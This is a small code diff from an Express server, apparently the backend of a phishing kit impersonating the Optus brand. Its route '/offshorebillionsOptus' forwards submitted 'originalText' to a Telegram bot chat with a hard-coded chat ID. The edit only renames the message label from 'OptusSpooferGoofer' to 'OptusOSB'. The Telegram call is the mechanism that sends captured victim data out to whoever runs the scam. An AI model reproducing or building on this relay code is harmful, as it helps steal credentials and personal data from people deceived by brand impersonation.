@@ -6338,7 +6338,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
       } else {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusSpooferGoofer:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusOSB:\n${originalText}`
           )
           .catch((err) => {
             console.log(err);
